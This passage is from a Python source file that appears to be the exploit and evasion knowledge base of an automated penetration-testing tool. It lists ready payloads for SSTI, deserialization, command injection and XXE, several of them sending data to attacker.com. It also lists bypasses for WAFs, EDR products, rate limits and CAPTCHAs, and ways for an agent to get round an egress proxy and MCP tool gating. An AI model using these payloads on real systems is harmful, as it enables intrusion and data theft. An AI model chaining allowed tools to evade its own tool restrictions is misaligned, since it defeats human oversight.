        description="Traverse Python MRO to access os module: {{''.__class__.__mro__[1].__subclasses__()}} then find subprocess.Popen or os._wrap_close for command execution.",
        payload_template="{{''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}",
        context="X varies by Python version. Enumerate subclasses to find Popen index. Also try: config.items() for secret exposure.",
        success_rate=0.5,
        source="Jinja2 SSTI exploitation",
        tags=["ssti", "jinja2", "rce", "python"],
    ),
    ExploitTechnique(
        technique_id="ssti-twig-rce",
        vuln_type="ssti",
        name="Twig SSTI to RCE via filter chain",
        description="Twig template engine RCE: {{['id']|filter('system')}} or {{_self.env.setCache('ftp://attacker.com')}}{{_self.env.loadTemplate('backdoor')}}.",
        payload_template="{{['id']|filter('system')}}",
        context="Twig versions before 3.x are more permissive. Check version with {{dump()}}.",
        success_rate=0.45,
        source="Twig SSTI research",
        tags=["ssti", "twig", "rce", "php"],
    ),
    ExploitTechnique(
        technique_id="ssti-freemarker-rce",
        vuln_type="ssti",
        name="Freemarker SSTI to RCE",
        description="Freemarker template engine RCE via built-in Execute: <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}.",
        payload_template="<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
        context="Works on Java applications using Freemarker. Also try: ObjectConstructor for class instantiation.",
        success_rate=0.45,
        source="Freemarker SSTI research",
        tags=["ssti", "freemarker", "rce", "java"],
    ),

    # ============== Deserialization ==============
    ExploitTechnique(
        technique_id="deser-java-commons",
        vuln_type="deserialization",
        name="Java deserialization via Commons Collections gadget",
        description="Use ysoserial to generate Java deserialization payloads targeting Apache Commons Collections (CC1-CC7), BeanUtils, Spring, Groovy gadget chains. Inject via cookies, parameters, or HTTP body.",
        payload_template="ysoserial CommonsCollections6 'curl attacker.com/$(whoami)' | base64",
        context="Look for Java serialized objects (rO0AB, aced0005 hex). Check cookies, ViewState, custom protocols.",
        success_rate=0.4,
        source="ysoserial project",
        tags=["deserialization", "java", "rce", "gadget_chain"],
    ),
    ExploitTechnique(
        technique_id="deser-python-pickle",
        vuln_type="deserialization",
        name="Python pickle deserialization RCE",
        description="Craft malicious pickle payload with __reduce__ method to execute arbitrary commands. Target APIs accepting pickled data, ML model files, session data.",
        payload_template="import pickle,os; class P(object):\n  def __reduce__(self): return (os.system,('id',))\npickle.dumps(P())",
        context="Look for: pickle.loads, cPickle.loads in Python apps. Check file uploads accepting .pkl, .pickle.",
        success_rate=0.5,
        source="Python security research",
        tags=["deserialization", "python", "pickle", "rce"],
    ),
    ExploitTechnique(
        technique_id="deser-php-phar",
        vuln_type="deserialization",
        name="PHP Phar deserialization via file operations",
        description="Trigger PHP deserialization through phar:// stream wrapper in file operations (file_exists, fopen, etc.). Craft Phar archive with malicious metadata.",
        payload_template="phar:///tmp/uploaded.jpg/test.txt",
        context="Requires: file upload + a file operation on user-controlled path. Phar metadata is deserialized automatically.",
        success_rate=0.35,
        source="PHP deserialization research",
        tags=["deserialization", "php", "phar"],
    ),
    ExploitTechnique(
        technique_id="deser-dotnet-viewstate",
        vuln_type="deserialization",
        name=".NET ViewState deserialization RCE",
        description="Exploit insecure ASP.NET ViewState deserialization with known machine key. Use ysoserial.net to generate payloads. Decrypted ViewState allows arbitrary object deserialization.",
        payload_template="ysoserial.net -p ViewState -g ActivitySurrogateDisableTypeCheck -c 'cmd /c whoami' --validationalg=HMACSHA256 --validationkey=KEY",
        context="Requires machine key (check web.config disclosure, error pages, or default keys). Check __VIEWSTATE field.",
        success_rate=0.35,
        source=".NET security research",
        tags=["deserialization", "dotnet", "viewstate", "rce"],
    ),

    # ============== Command Injection ==============
    ExploitTechnique(
        technique_id="cmdi-basic-semicolon",
        vuln_type="command_injection",
        name="OS command injection via command separator",
        description="Inject additional commands using separators: ; (sequential), && (on success), || (on failure), | (pipe), \\n (newline). Test with time delays for blind detection.",
        payload_template="; id; whoami; cat /etc/passwd",
        context="Test in: hostname/IP inputs, file operations, diagnostic tools, backup features. Also try backticks: `id`",
        success_rate=0.5,
        source="OWASP Testing Guide",
        tags=["command_injection", "separator", "rce"],
    ),
    ExploitTechnique(
        technique_id="cmdi-blind-sleep",
        vuln_type="command_injection",
        name="Blind command injection via time delay",
        description="Confirm blind command injection with time-based payloads: ;sleep 10;, ;ping -c 10 127.0.0.1;. Measure response time difference.",
        payload_template="; sleep 10 #",
        context="Use when no output is reflected. Also try: $(sleep 10), `sleep 10`, |sleep 10",
        success_rate=0.45,
        source="OWASP Testing Guide",
        tags=["command_injection", "blind", "time"],
    ),
    ExploitTechnique(
        technique_id="cmdi-oob-exfil",
        vuln_type="command_injection",
        name="Command injection out-of-band data exfiltration",
        description="Exfiltrate command output via DNS or HTTP: ;curl attacker.com/$(whoami);, ;nslookup $(hostname).attacker.com;. Receive data on callback server.",
        payload_template="; curl http://attacker.com/exfil?d=$(cat /etc/passwd | base64) #",
        context="Useful for blind injection. Set up Burp Collaborator or interactsh for callbacks.",
        success_rate=0.4,
        source="Command injection techniques",
        tags=["command_injection", "oob", "exfiltration"],
    ),
    ExploitTechnique(
        technique_id="cmdi-filter-bypass",
        vuln_type="command_injection",
        name="Command injection filter bypass techniques",
        description="Bypass character filters: use $IFS for spaces, hex/octal for characters, variable expansion (w${IFS}hoami), wildcards (/etc/pass??), rev encoding.",
        payload_template="cat${IFS}/etc/passwd",
        context="When spaces blocked: ${IFS}, {cat,/etc/passwd}, cat</etc/passwd. When keywords blocked: who$()ami, w'h'oami.",
        success_rate=0.4,
        source="Command injection bypass research",
        tags=["command_injection", "filter_bypass"],
    ),

    # ============== XXE ==============
    ExploitTechnique(
        technique_id="xxe-file-read",
        vuln_type="xxe",
        name="XXE file disclosure via external entity",
        description="Define an external entity referencing a local file and include it in the XML response. Classic: <!ENTITY xxe SYSTEM 'file:///etc/passwd'>&xxe;",
        payload_template='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>',
        context="Test in: XML API endpoints, SOAP services, file uploads (SVG, DOCX, XLSX contain XML). Check Content-Type: application/xml.",
        success_rate=0.5,
        source="OWASP Testing Guide",
        tags=["xxe", "file_read", "lfi"],
    ),
    ExploitTechnique(
        technique_id="xxe-blind-oob",
        vuln_type="xxe",
        name="Blind XXE via out-of-band exfiltration",
        description="When no inline output, use parameter entities to exfiltrate via HTTP/DNS. Define external DTD on attacker server that reads local files and sends them as URL parameters.",
        payload_template='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><data>test</data>',
        context="Requires external DTD: <!ENTITY % file SYSTEM 'file:///etc/passwd'><!ENTITY % eval '<!ENTITY &#x25; exfiltrate SYSTEM \"http://attacker.com/?d=%file;\">'>",
        success_rate=0.4,
        source="PortSwigger XXE research",
        tags=["xxe", "blind", "oob", "exfiltration"],
    ),
    ExploitTechnique(
        technique_id="xxe-ssrf-chain",
        vuln_type="xxe",
        name="XXE to SSRF escalation",
        description="Use XXE to access internal services via SSRF: <!ENTITY xxe SYSTEM 'http://169.254.169.254/latest/meta-data/'>. Combine with gopher:// for arbitrary TCP.",
        payload_template='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><data>&xxe;</data>',
        context="XXE provides full SSRF capabilities. Can access cloud metadata, internal APIs, and databases.",
        success_rate=0.45,
        source="XXE exploitation research",
        tags=["xxe", "ssrf", "cloud", "metadata"],
    ),

    # ============== Miscellaneous ==============
    ExploitTechnique(
        technique_id="cors-misconfiguration",
        vuln_type="cors_misconfig",
        name="CORS misconfiguration exploitation",
        description="Exploit overly permissive CORS: Access-Control-Allow-Origin reflecting arbitrary origins, null origin allowed, or wildcard with credentials. Steal data cross-origin.",
        payload_template="Origin: https://attacker.com (check if reflected in ACAO header)",
        context="Test by sending Origin header. Check: reflected origin, null origin, subdomain wildcard.",
        success_rate=0.5,
        source="OWASP Testing Guide",
        tags=["cors", "misconfiguration", "data_theft"],
    ),
    ExploitTechnique(
        technique_id="csrf-basic",
        vuln_type="csrf",
        name="CSRF via missing anti-CSRF token",
        description="Craft HTML page that auto-submits a form to the target with the victim's cookies. Test state-changing operations (password change, email update, money transfer).",
        payload_template='<form action="https://target.com/api/change-email" method="POST"><input name="email" value="attacker@evil.com"><script>document.forms[0].submit()</script></form>',
        context="Check for: missing CSRF tokens, SameSite=None cookies, GET requests for state changes.",
        success_rate=0.4,
        source="OWASP Testing Guide",
        tags=["csrf", "session", "state_change"],
    ),
    ExploitTechnique(
        technique_id="open-redirect",
        vuln_type="open_redirect",
        name="Open redirect for phishing and token theft",
        description="Exploit URL redirect parameters to redirect users to attacker-controlled domains. Chain with OAuth flows to steal authorization codes/tokens.",
        payload_template="/login?redirect=https://attacker.com/phish",
        context="Check: ?next=, ?url=, ?redirect=, ?return=, ?goto= parameters. Try: //attacker.com, /\\attacker.com.",
        success_rate=0.55,
        source="OWASP Testing Guide",
        tags=["open_redirect", "phishing", "oauth"],
    ),
    ExploitTechnique(
        technique_id="graphql-introspection",
        vuln_type="info_disclosure",
        name="GraphQL introspection for schema enumeration",
        description="Use introspection query to dump the full GraphQL schema including types, queries, mutations, and fields. Reveals hidden API functionality and internal data models.",
        payload_template='{"query":"{__schema{types{name fields{name type{name}}}}}"}',
        context="Test /graphql, /graphiql endpoints. If introspection disabled, try field suggestion errors.",
        success_rate=0.6,
        source="API security testing",
        tags=["graphql", "introspection", "enumeration"],
    ),
]

# -----------------------------------------------------------------------
# Tech Stack Signatures
# -----------------------------------------------------------------------

_TECH_SIGNATURES: list[TechSignature] = [
    TechSignature(
        tech_stack="express+mysql",
        common_vulns=["sqli", "xss", "ssrf", "path_traversal"],
        default_configs={
            "db_port": "3306",
            "orm": "often raw queries or Sequelize",
            "session": "express-session with cookie store",
        },
        detection_hints=["X-Powered-By: Express", "connect.sid cookie"],
    ),
    TechSignature(
        tech_stack="express+mongodb",
        common_vulns=["nosql_injection", "xss", "ssrf", "idor"],
        default_configs={
            "db_port": "27017",
            "orm": "Mongoose ODM",
            "session": "express-session with connect-mongo",
        },
        detection_hints=["X-Powered-By: Express", "connect.sid cookie", "ObjectId patterns in URLs"],
    ),
    TechSignature(
        tech_stack="express+sqlite",
        common_vulns=["sqli", "xss", "path_traversal"],
        default_configs={
            "db": "file-based SQLite",
            "orm": "better-sqlite3 or sqlite3",
            "session": "express-session with file store",
        },
        detection_hints=["X-Powered-By: Express", ".db or .sqlite files"],
    ),
    TechSignature(
        tech_stack="django+postgresql",
        common_vulns=["sqli", "ssti", "xss", "ssrf", "idor"],
        default_configs={
            "db_port": "5432",
            "orm": "Django ORM (raw SQL still possible)",
            "session": "django.contrib.sessions",
            "csrf": "csrf_token middleware enabled by default",
        },
        detection_hints=["csrftoken cookie", "csrfmiddlewaretoken in forms", "Django debug page"],
    ),
    TechSignature(
        tech_stack="flask+postgresql",
        common_vulns=["sqli", "ssti", "xss", "ssrf"],
        default_configs={
            "db_port": "5432",
            "orm": "SQLAlchemy",
            "template": "Jinja2 (SSTI risk if user input in templates)",
        },
        detection_hints=["Werkzeug debug page", "session cookie format"],
    ),
    TechSignature(
        tech_stack="spring+mysql",
        common_vulns=["sqli", "deserialization", "ssrf", "ssti"],
        default_configs={
            "db_port": "3306",
            "orm": "Hibernate/JPA",
            "actuator": "/actuator endpoints may expose env/health",
        },
        detection_hints=["Whitelabel Error Page", "JSESSIONID cookie", "/actuator/health"],
    ),
    TechSignature(
        tech_stack="rails+postgresql",
        common_vulns=["sqli", "xss", "ssrf", "deserialization", "idor"],
        default_configs={
            "db_port": "5432",
            "orm": "ActiveRecord",
            "session": "encrypted cookies by default",
            "csrf": "authenticity_token in forms",
        },
        detection_hints=["X-Request-Id header", "_session_id cookie", "ActionController patterns"],
    ),
    TechSignature(
        tech_stack="php+mysql",
        common_vulns=["sqli", "xss", "path_traversal", "command_injection", "deserialization"],
        default_configs={
            "db_port": "3306",
            "orm": "often raw queries or PDO",
            "session": "PHPSESSID cookie",
            "file_upload": "move_uploaded_file",
        },
        detection_hints=["PHPSESSID cookie", "X-Powered-By: PHP", ".php extensions"],
    ),
    TechSignature(
        tech_stack="aspnet+mssql",
        common_vulns=["sqli", "xss", "deserialization", "path_traversal"],
        default_configs={
            "db_port": "1433",
            "orm": "Entity Framework or raw ADO.NET",
            "session": "ASP.NET_SessionId cookie",
            "viewstate": "__VIEWSTATE may be deserializable",
        },
        detection_hints=["ASP.NET_SessionId cookie", "__VIEWSTATE in forms", "X-AspNet-Version header"],
    ),
    TechSignature(
        tech_stack="juice-shop",
        common_vulns=["sqli", "xss", "idor", "auth_bypass", "path_traversal", "xxe"],
        default_configs={
            "db": "SQLite in-memory",
            "framework": "Express.js + Angular",
            "auth": "JWT with known weaknesses (none alg, weak secret)",
            "api_style": "REST + some legacy SOAP",
        },
        detection_hints=["Juice Shop branding", "Angular SPA", "Express backend"],
    ),
]


# -----------------------------------------------------------------------
# Defense Signatures
# -----------------------------------------------------------------------

_DEFENSE_SIGNATURES: list[DefenseSignature] = [
    # ============== WAF Signatures ==============
    DefenseSignature(
        defense_id="waf-modsecurity-crs",
        defense_type="waf",
        product="ModSecurity OWASP CRS",
        detection_patterns=[
            "mod_security", "modsec", "NOYB",
            "not acceptable", "406 not acceptable",
        ],
        known_bypasses=[
            "Unicode normalization (e.g. %u0027 for single quote)",
            "Double URL encoding (%2527 decodes to %27 then to ')",
            "Inline SQL comments to split keywords: SEL/**/ECT",
            "Case alternation: SeLeCt, uNiOn",
            "HPP (HTTP Parameter Pollution) to split payload across params",
            "Content-Type mismatch: send JSON body with urlencoded Content-Type",
        ],
        evasion_techniques=[
            "double_url_encode", "unicode_normalize",
            "comment_injection", "mixed_case", "content_type_mismatch",
        ],
        confidence_indicators=[
            "mod_security", "modsecurity", "OWASP_CRS",
            "SecRule", "ModSecurity Action",
        ],
        severity="medium",
    ),
    DefenseSignature(
        defense_id="waf-cloudflare",
        defense_type="waf",
        product="Cloudflare WAF",
        detection_patterns=[
            "cf-ray", "cloudflare", "__cfduid",
            "attention required", "cloudflare ray id",
            "error 1010", "error 1020", "error 1015",
        ],
        known_bypasses=[
            "Use origin IP directly (bypass DNS proxy) if leaked via mail headers or DNS history",
            "Chunked Transfer-Encoding to split payload across chunks",
            "Unicode normalization exploiting Cloudflare's decoder differences",
            "Multipart form-data with boundary manipulation",
            "HTTP/2 HPACK header smuggling",
        ],
        evasion_techniques=[
            "chunked_encoding", "unicode_normalize",
            "content_type_mismatch", "http2_desync",
        ],
        confidence_indicators=[
            "cf-ray", "server: cloudflare", "__cfduid",
            "cf-cache-status", "cf-request-id",
        ],
        severity="hard",
    ),
    DefenseSignature(
        defense_id="waf-aws-waf",
        defense_type="waf",
        product="AWS WAF",
        detection_patterns=[
            "aws waf", "waf rule", "request blocked",
            "x-amzn-requestid", "403 forbidden",
        ],
        known_bypasses=[
            "JSON-based SQLi payloads bypass string-matching rules",
            "Overlong UTF-8 encoding for path traversal",
            "Case variation in SQL keywords",
            "Use of CHAR() function instead of string literals",
            "Payload fragmentation across multiple parameters",
        ],
        evasion_techniques=[
            "unicode_normalize", "mixed_case",
            "concatenation_split", "hex_encode",
        ],
        confidence_indicators=[
            "x-amzn-requestid", "x-amz-cf-id",
            "awselb", "via: 1.1 .*.cloudfront.net",
        ],
        severity="medium",
    ),
    DefenseSignature(
        defense_id="waf-azure-front-door",
        defense_type="waf",
        product="Azure Front Door WAF",
        detection_patterns=[
            "azure front door", "afd-", "x-azure-ref",
            "request blocked by waf",
        ],
        known_bypasses=[
            "HTTP parameter pollution across duplicate params",
            "Overlong UTF-8 sequences for path normalization bypass",
            "Transfer-Encoding chunked with zero-length chunks",
            "Multiline header injection",
        ],
        evasion_techniques=[
            "chunked_encoding", "unicode_normalize",
            "header_smuggling", "double_url_encode",
        ],
        confidence_indicators=[
            "x-azure-ref", "x-fd-healthprobe", "afd-",
        ],
        severity="medium",
    ),
    DefenseSignature(
        defense_id="waf-akamai",
        defense_type="waf",
        product="Akamai Kona Site Defender",
        detection_patterns=[
            "akamai", "akamaighost", "reference #",
            "access denied", "akamai ghost",
        ],
        known_bypasses=[
            "HPP with array parameters (?param[]=val1&param[]=val2)",
            "Null byte injection in URL path (%00)",
            "Alternate IP representations for SSRF (decimal, hex, octal)",
            "Request smuggling via CL.TE or TE.CL desync",
        ],
        evasion_techniques=[
            "null_byte_insert", "double_url_encode",
            "header_smuggling", "http2_desync",
        ],
        confidence_indicators=[
            "x-akamai-session", "akamaighost",
            "server: akamaighost", "akamai-grn",
        ],
        severity="hard",
    ),
    DefenseSignature(
        defense_id="waf-imperva",
        defense_type="waf",
        product="Imperva Incapsula",
        detection_patterns=[
            "incapsula", "imperva", "visid_incap",
            "_incap_ses_", "incap_ses",
        ],
        known_bypasses=[
            "HTTP desync / request smuggling via ambiguous Content-Length",
            "Unicode full-width characters (e.g. FULLWIDTH APOSTROPHE)",
            "Payload within multipart MIME boundaries",
            "Large POST body to exceed WAF inspection buffer",
        ],
        evasion_techniques=[
            "http2_desync", "unicode_normalize",
            "content_type_mismatch", "chunked_encoding",
        ],
        confidence_indicators=[
            "visid_incap", "incap_ses", "x-iinfo",
            "x-cdn: imperva",
        ],
        severity="hard",
    ),
    DefenseSignature(
        defense_id="waf-f5-bigip-asm",
        defense_type="waf",
        product="F5 BIG-IP ASM",
        detection_patterns=[
            "bigip", "f5", "big-ip", "asm",
            "support id", "your request was blocked",
        ],
        known_bypasses=[
            "Verb tampering: use unusual HTTP methods (PATCH, OPTIONS) that may bypass ASM policies",
            "JSON content injection (application/json body bypasses URL param rules)",
            "HTTP/2 rapid reset to confuse connection tracking",
            "Wildcard injection in SQL (information_schema.% instead of tables)",
        ],
        evasion_techniques=[
            "content_type_mismatch", "http2_desync",
            "mixed_case", "comment_injection",
        ],
        confidence_indicators=[
            "bigipserver", "big-ip", "f5-ltm",
            "server: bigip", "x-wa-info",
        ],
        severity="hard",
    ),
    DefenseSignature(
        defense_id="waf-barracuda",
        defense_type="waf",
        product="Barracuda WAF",
        detection_patterns=[
            "barracuda", "barra_counter_session",
            "you have been blocked", "barracuda networks",
        ],
        known_bypasses=[
            "URL-encoded newlines (%0a%0d) to bypass header injection rules",
            "Alternate encoding of path traversal (..%c0%af, ..%ef%bc%8f)",
            "Cookie injection via Set-Cookie header reflection",
            "Bypassing XSS rules via SVG elements and data: URIs",
        ],
        evasion_techniques=[
            "double_url_encode", "unicode_normalize",
            "null_byte_insert", "whitespace_variation",
        ],
        confidence_indicators=[
            "barra_counter_session", "barracuda_",
            "server: barracuda",
        ],
        severity="medium",
    ),
    DefenseSignature(
        defense_id="waf-sucuri",
        defense_type="waf",
        product="Sucuri CloudProxy",
        detection_patterns=[
            "sucuri", "cloudproxy", "access denied - sucuri",
            "sucuri firewall", "sucuri website firewall",
        ],
        known_bypasses=[
            "Origin IP discovery via DNS history, certificate transparency, or email headers",
            "Double URL encoding with hex character substitution",
            "SQL injection via scientific notation in numeric contexts",
            "XSS via JavaScript URL scheme in href attributes",
        ],
        evasion_techniques=[
            "double_url_encode", "hex_encode",
            "polymorphic_payload", "proxy_rotate",
        ],
        confidence_indicators=[
            "x-sucuri-id", "server: sucuri",
            "sucuri/cloudproxy", "x-sucuri-cache",
        ],
        severity="medium",
    ),
    DefenseSignature(
        defense_id="waf-wordfence",
        defense_type="waf",
        product="Wordfence (WordPress)",
        detection_patterns=[
            "wordfence", "wfwaf", "your access to this site has been limited",
            "wordfence central", "generated by wordfence",
        ],
        known_bypasses=[
            "Bypass via direct wp-admin access if IP whitelisted",
            "PHP type juggling in login parameters (0e prefix)",
            "REST API access via /wp-json/ bypasses some Wordfence rules",
            "Payload in WordPress nonce verification parameters",
        ],
        evasion_techniques=[
            "slow_rate", "user_agent_rotate",
            "double_url_encode", "mixed_case",
        ],
        confidence_indicators=[
            "wordfence", "wfwaf-authcookie",
            "wordfence_loginhash", "x-wordfence",
        ],
        severity="easy",
    ),
    DefenseSignature(
        defense_id="waf-generic",
        defense_type="waf",
        product="Generic WAF",
        detection_patterns=[
            "403 forbidden", "request blocked",
            "access denied", "blocked by firewall",
            "security violation", "suspicious request",
        ],
        known_bypasses=[
            "Try all encoding variants: URL, double URL, Unicode, hex",
            "HTTP verb tampering (switch GET to POST or vice versa)",
            "Add X-Forwarded-For header with 127.0.0.1 to spoof trusted IP",
            "Payload fragmentation across headers and body",
        ],
        evasion_techniques=[
            "double_url_encode", "mixed_case", "unicode_normalize",
            "comment_injection", "chunked_encoding",
        ],
        confidence_indicators=[
            "403", "blocked", "denied", "firewall",
        ],
        severity="medium",
    ),
    DefenseSignature(
        defense_id="waf-nginx-naxsi",
        defense_type="waf",
        product="Nginx NAXSI",
        detection_patterns=[
            "naxsi", "blocked by naxsi",
            "request denied", "naxsi/waf",
        ],
        known_bypasses=[
            "NAXSI uses character scoring; split payload to stay below threshold",
            "Send payload via HTTP headers (X-Forwarded-For, Referer) which may not be inspected",
            "Multipart form encoding with unusual boundary strings",
            "Use of backtick (`) instead of quote in MySQL contexts",
        ],
        evasion_techniques=[
            "concatenation_split", "header_smuggling",
            "content_type_mismatch", "whitespace_variation",
        ],
        confidence_indicators=[
            "naxsi", "x-naxsi-sig",
        ],
        severity="easy",
    ),
    DefenseSignature(
        defense_id="waf-fortiweb",
        defense_type="waf",
        product="Fortinet FortiWeb",
        detection_patterns=[
            "fortiweb", "fortigate", "fortinet",
            "server: fortiweb", "blocked by fortiweb",
        ],
        known_bypasses=[
            "HTTP/2 multiplexing to send payload fragments in different streams",
            "JSON injection bypassing URL parameter inspection",
            "Oversize request body to exceed inspection buffer",
            "IP spoofing via X-Real-IP or X-Forwarded-For headers",
        ],
        evasion_techniques=[
            "http2_desync", "content_type_mismatch",
            "header_smuggling", "chunked_encoding",
        ],
        confidence_indicators=[
            "fortiweb", "fwb_", "fortigate",
        ],
        severity="medium",
    ),
    DefenseSignature(
        defense_id="waf-citrix-netscaler",
        defense_type="waf",
        product="Citrix NetScaler AppFirewall",
        detection_patterns=[
            "netscaler", "ns_af", "citrix",
            "application firewall", "ns_af_sid",
        ],
        known_bypasses=[
            "HTTP request smuggling via CL.TE and TE.CL desync",
            "URL path normalization differences (/./ and /../ handling)",
            "Payload in non-standard headers (X-Custom, X-Requested-With)",
            "Encoding payload as base64 in JSON body fields",
        ],
        evasion_techniques=[
            "header_smuggling", "http2_desync",
            "double_url_encode", "content_type_mismatch",
        ],
        confidence_indicators=[
            "ns_af", "citrix_ns_id", "netscaler",
            "cneonction", "server: netscaler",
        ],
        severity="hard",
    ),

    # ============== EDR / Host Defense Signatures ==============
    DefenseSignature(
        defense_id="edr-apparmor",
        defense_type="apparmor",
        product="AppArmor",
        detection_patterns=[
            "apparmor", "permission denied",
            "operation not permitted", "apparmor denied",
        ],
        known_bypasses=[
            "Use allowed paths to read/write files (check profile for exceptions)",
            "Symlink race conditions to access restricted paths",
            "Use alternative executables not covered by the profile (e.g. busybox)",
            "Memory-only payloads that avoid filesystem access",
        ],
        evasion_techniques=[
            "polymorphic_payload", "concatenation_split",
        ],
        confidence_indicators=[
            "apparmor=\"DENIED\"", "audit", "profile=",
        ],
        severity="hard",
    ),
    DefenseSignature(
        defense_id="edr-seccomp",
        defense_type="seccomp",
        product="seccomp-bpf",
        detection_patterns=[
            "bad system call", "seccomp", "operation not permitted",
            "killed", "sigsys",
        ],
        known_bypasses=[
            "Use allowed syscalls to achieve same effect (e.g. openat instead of open)",
            "Exploit permitted syscalls with unexpected arguments",
            "Use ioctl with custom commands if ioctl is allowed",
            "Leverage ptrace if available in the seccomp profile",
        ],
        evasion_techniques=[
            "polymorphic_payload",
        ],
        confidence_indicators=[
            "seccomp", "sigsys", "bad system call",
            "audit_seccomp",
        ],
        severity="extreme",
    ),
    DefenseSignature(
        defense_id="edr-cgroup-net",
        defense_type="edr",
        product="cgroup Network Restrictions",
        detection_patterns=[
            "network unreachable", "connection refused",
            "no route to host", "network is down",
        ],
        known_bypasses=[
            "DNS tunneling through allowed DNS resolvers",
            "Use allowed ports/protocols (e.g. HTTPS on 443 for C2)",
            "WebSocket over allowed HTTP endpoints",
            "ICMP tunneling if ping is allowed",
        ],
        evasion_techniques=[
            "proxy_rotate", "slow_rate",
        ],
        confidence_indicators=[
            "cgroup", "network namespace", "net_cls",
        ],
        severity="hard",
    ),
    DefenseSignature(
        defense_id="edr-aegis-egress",
        defense_type="egress_proxy",
        product="Aegis Egress Proxy",
        detection_patterns=[
            "egress denied", "egress proxy", "allowlist",
            "egress violation", "outbound blocked",
        ],
        known_bypasses=[
            "Tunnel through allowed domains using DNS rebinding",
            "Use allowed API endpoints for data exfiltration",
            "Encode data in DNS TXT queries to allowed resolvers",
            "Use WebSocket upgrades on allowed HTTP endpoints",
        ],
        evasion_techniques=[
            "proxy_rotate", "slow_rate", "referer_spoof",
        ],
        confidence_indicators=[
            "aegis", "egress", "allowlist",
            "x-aegis-policy", "egress-proxy",
        ],
        severity="hard",
    ),
    DefenseSignature(
        defense_id="edr-mcp-guard",
        defense_type="mcp_guard",
        product="MCP Tool Gating",
        detection_patterns=[
            "tool not allowed", "mcp guard", "tool denied",
            "forbidden tool", "tool gating",
        ],
        known_bypasses=[
            "Use alternative MCP tools that achieve the same outcome",
            "Chain multiple allowed tools to replicate denied tool functionality",
            "Request tool access escalation from engagement config",
            "Use browser automation (Playwright) instead of blocked tools",
        ],
        evasion_techniques=[
            "polymorphic_payload",
        ],
        confidence_indicators=[
            "mcp", "tool_gate", "tool_denied",
            "mcp-guard",
        ],
        severity="medium",
    ),
    DefenseSignature(
        defense_id="edr-crowdstrike",
        defense_type="edr",
        product="CrowdStrike Falcon",
        detection_patterns=[
            "crowdstrike", "falcon", "csfalcon",
            "process blocked", "threat prevented",
        ],
        known_bypasses=[
            "In-memory execution (fileless) to avoid on-disk scanning",
            "DLL sideloading via signed executables",
            "Use of LOLBins (living-off-the-land binaries) like certutil, mshta",
            "Parent PID spoofing to evade process chain detection",
            "Timestomping to avoid temporal correlation",
        ],
        evasion_techniques=[
            "polymorphic_payload", "slow_rate", "random_jitter",
        ],
        confidence_indicators=[
            "csfalcon", "crowdstrike", "cs-falcon-sensor",
            "csagent", "falcon-sensor",
        ],
        severity="extreme",
    ),
    DefenseSignature(
        defense_id="edr-sentinelone",
        defense_type="edr",
        product="SentinelOne",
        detection_patterns=[
            "sentinelone", "sentinel agent", "threat detected",
            "s1-agent", "sentinelagent",
        ],
        known_bypasses=[
            "Direct syscalls instead of using ntdll.dll (Windows)",
            "Memory-only execution without dropping files",
            "Use of .NET reflection and in-memory assembly loading",
            "Unhooking technique to restore original ntdll in process memory",
            "ETW patching to blind telemetry collection",
        ],
        evasion_techniques=[
            "polymorphic_payload", "slow_rate",
        ],
        confidence_indicators=[
            "sentinelone", "s1-agent", "sentinelagent",
            "sentinel_one",
        ],
        severity="extreme",
    ),
    DefenseSignature(
        defense_id="edr-wazuh",
        defense_type="ids",
        product="Wazuh HIDS",
        detection_patterns=[
            "wazuh", "ossec", "alert level",
            "rule.level", "wazuh-agent",
        ],
        known_bypasses=[
            "Slow operations to stay below alert thresholds",
            "Modify log entries in-flight if log pipe is writable",
            "Use alternative commands not in Wazuh's command monitoring list",
            "Timestomping file modifications to avoid file integrity monitoring",
        ],
        evasion_techniques=[
            "slow_rate", "random_jitter", "polymorphic_payload",
        ],
        confidence_indicators=[
            "wazuh", "ossec", "wazuh-agent",
            "ossec-agent",
        ],
        severity="medium",
    ),

    # ============== Application-Level Defense Signatures ==============
    DefenseSignature(
        defense_id="app-rate-limit-token-bucket",
        defense_type="rate_limiter",
        product="Rate Limiter (Token Bucket)",
        detection_patterns=[
            "429 too many requests", "rate limit exceeded",
            "retry-after", "x-ratelimit-remaining: 0",
        ],
        known_bypasses=[
            "Slow request rate below threshold (observe X-RateLimit-Limit header)",
            "Rotate source IPs via proxy to reset per-IP buckets",
            "Use different API keys or auth tokens per batch",
            "Target different endpoints that share the same backend",
        ],
        evasion_techniques=[
            "slow_rate", "random_jitter", "proxy_rotate",
            "user_agent_rotate",
        ],
        confidence_indicators=[
            "x-ratelimit-limit", "x-ratelimit-remaining",
            "x-ratelimit-reset", "retry-after",
        ],
        severity="easy",
    ),
    DefenseSignature(
        defense_id="app-rate-limit-sliding-window",
        defense_type="rate_limiter",
        product="Rate Limiter (Sliding Window)",
        detection_patterns=[
            "429 too many requests", "rate limited",
            "too many requests", "slow down",
        ],
        known_bypasses=[
            "Burst then pause: send requests in small batches with long gaps",
            "Distribute requests across multiple time windows",
            "Use HEAD requests which may not count toward rate limit",
            "Vary request signatures (User-Agent, Accept headers) to avoid fingerprint-based limits",
        ],
        evasion_techniques=[
            "burst_then_pause", "slow_rate", "random_jitter",
            "user_agent_rotate",
        ],
        confidence_indicators=[
            "429", "x-ratelimit", "retry-after",
        ],
        severity="easy",
    ),
    DefenseSignature(
        defense_id="app-captcha-recaptcha",
        defense_type="captcha",
        product="Google reCAPTCHA",
        detection_patterns=[
            "recaptcha", "g-recaptcha", "recaptcha-token",
            "grecaptcha", "recaptcha/api",
        ],
        known_bypasses=[
            "Use CAPTCHA solving services (2captcha, anti-captcha) as last resort",
            "Find API endpoints that don't enforce CAPTCHA validation",
            "Reuse valid CAPTCHA tokens across multiple requests",
            "Target mobile API endpoints which may skip CAPTCHA",
        ],
        evasion_techniques=[
            "abort_target", "deprioritize",
        ],
        confidence_indicators=[
            "g-recaptcha-response", "recaptcha/api.js",
            "grecaptcha.execute", "sitekey",
        ],
        severity="extreme",
    ),
    DefenseSignature(
        defense_id="app-captcha-hcaptcha",
        defense_type="captcha",
        product="hCaptcha",
